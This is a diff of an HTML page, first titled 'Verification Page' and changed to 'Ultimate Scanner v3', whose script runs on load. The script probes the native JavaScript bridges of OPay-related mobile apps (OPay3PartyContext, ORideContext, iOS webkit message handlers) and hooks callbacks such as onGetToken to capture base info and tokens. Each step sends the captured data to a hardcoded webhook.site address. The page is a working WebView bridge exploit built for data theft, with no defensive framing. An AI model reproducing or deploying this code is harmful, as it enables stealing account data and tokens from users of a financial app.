@@ -4,102 +4,89 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification Page</title>
+  <title>Ultimate Scanner v3</title>
 </head>
 
 <body
-  style="background: white; color: black; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
-  <h2 id="status">INITIALIZING...</h2>
-  <div id="log"
-    style="font-size: 11px; color: #666; text-align: left; max-width: 400px; margin: 0 auto; word-break: break-all;">
-  </div>
+  style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
+  <h1 id="status">SCANNING...</h1>
+  <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>
 
   <script>
     (function () {
       var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
-      var status = document.getElementById('status');
       var logDiv = document.getElementById('log');
 
       function report(msg, type) {
         var div = document.createElement('div');
-        div.style.marginBottom = '5px';
-        div.style.color = type === 'success' ? 'green' : (type === 'error' ? 'red' : '#666');
-        div.innerText = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+        div.innerText = msg;
         logDiv.appendChild(div);
-
-        var i = new Image();
-        i.src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info');
+        new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&v=3&ts=' + Date.now();
       }
 
-      function sendFullData(label, data) {
+      function exfil(obj) {
         var xhr = new XMLHttpRequest();
         xhr.open('POST', WEBHOOK, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({ label: label, data: data, timestamp: new Date().toISOString() }));
+        xhr.send(JSON.stringify(obj));
+        status.innerText = 'DATA CAPTURED';
       }
 
-      // Register global callbacks
-      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'opayCallback', 'bridgeCallback', 'receiveMessage', 'handleNativeMessage', 'callbackHandler', 'onReceiveNativeMessage', 'opayNativeCallback'];
-      callbacks.forEach(function (callbackName) {
-        window[callbackName] = function (data) {
-          report('GLOBAL CALLBACK TRIGGERED: ' + callbackName, 'success');
-          sendFullData('Callback_' + callbackName, data);
-          status.innerText = 'DATA CAPTURED';
+      report('V3 SCANNER ACTIVE');
+
+      // 1. Massive callback registration
+      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'receiveMessage', 'opayCallback', 'onReceiveNativeMessage', 'handleNativeMessage'];
+      callbacks.forEach(function (n) {
+        window[n] = function (d) {
+          report('CALLBACK HIT: ' + n, 'success');
+          exfil({ source: 'callback', name: n, data: d });
         };
       });
 
-      report('Exploit Cycle Started (Callbacks Registered)');
-      status.innerText = 'EXECUTING...';
+      // 2. Automated Scan
+      setTimeout(function () {
+        report('Scanning window objects...');
 
-      var bridgeNames = ['control', 'OPay3PartyContext', 'ORideContext'];
+        var suspects = [];
+        for (var key in window) {
+          try {
+            if (key.toLowerCase().indexOf('opay') !== -1 || key.toLowerCase().indexOf('context') !== -1 || key.toLowerCase().indexOf('bridge') !== -1) {
+              suspects.push(key);
+            }
+          } catch (e) { }
+        }
+        report('Suspects found: ' + suspects.join(', '));
 
-      bridgeNames.forEach(function (name) {
-        // 1. Direct Method
-        try {
-          if (window[name]) {
-            report('Global Bridge: ' + name);
-            if (typeof window[name].getBaseInfo === 'function') {
-              var info = window[name].getBaseInfo();
-              report('Success: ' + name + '.getBaseInfo()', 'success');
-              sendFullData('DirectCall_' + name, info);
-              status.innerText = 'DATA CAPTURED';
+        // Hit WebKit messageHandlers
+        if (window.webkit && window.webkit.messageHandlers) {
+          var handlers = Object.keys(window.webkit.messageHandlers);
+          report('iOS Handlers: ' + handlers.join(', '));
+
+          handlers.forEach(function (h) {
+            try {
+              report('Posting to: ' + h);
+              window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
+              window.webkit.messageHandlers[h].postMessage({ method: 'getBaseInfo', cb: 'onGetBaseInfo' });
+            } catch (e) { report('Error ' + h + ': ' + e.message); }
+          });
+        }
+
+        // Check direct bridges
+        var targets = ['control', 'OPay3PartyContext', 'ORideContext', 'OPayContext'];
+        targets.forEach(function (b) {
+          if (window[b]) {
+            report('Calling Bridge: ' + b);
+            if (typeof window[b].getBaseInfo === 'function') {
+              try {
+                var res = window[b].getBaseInfo();
+                report('Success calling ' + b, 'success');
+                exfil({ source: 'direct', bridge: b, data: res });
+              } catch (e) { report('Err calling ' + b + ': ' + e.message); }
             }
           }
-        } catch (e) { report('Error DirectCall ' + name + ': ' + e.message, 'error'); }
+        });
 
-        // 2. iOS WebKit postMessage Method
-        try {
-          if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[name]) {
-            report('iOS Handler: ' + name);
-
-            // Try action: getBaseInfo
-            window.webkit.messageHandlers[name].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
-
-            // Try call: getBaseInfo
-            setTimeout(function () {
-              window.webkit.messageHandlers[name].postMessage({ call: 'getBaseInfo', callback: 'onGetBaseInfo' });
-            }, 500);
-
-            status.innerText = 'MESSAGE SENT';
-          }
-        } catch (e) { report('Error WebKit ' + name + ': ' + e.message, 'error'); }
-      });
-
-      // Special check for OPay3PartyContext with action: getBaseInfo
-      if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.OPay3PartyContext) {
-        setTimeout(function () {
-          report('Retrying OPay3PartyContext with variety of params');
-          window.webkit.messageHandlers.OPay3PartyContext.postMessage({ "method": "getBaseInfo", "callback": "onGetBaseInfo" });
-          window.webkit.messageHandlers.OPay3PartyContext.postMessage({ "cmd": "getBaseInfo", "cb": "onGetBaseInfo" });
-        }, 1000);
-      }
-
-      setTimeout(function () {
-        report('Exploit Cycle Complete');
-        if (status.innerText !== 'DATA CAPTURED' && status.innerText !== 'MESSAGE SENT') {
-          status.innerText = 'IDLE';
-        }
-      }, 5000);
+        report('Scan cycle complete');
+      }, 1500);
     })();
   </script>
 </body>
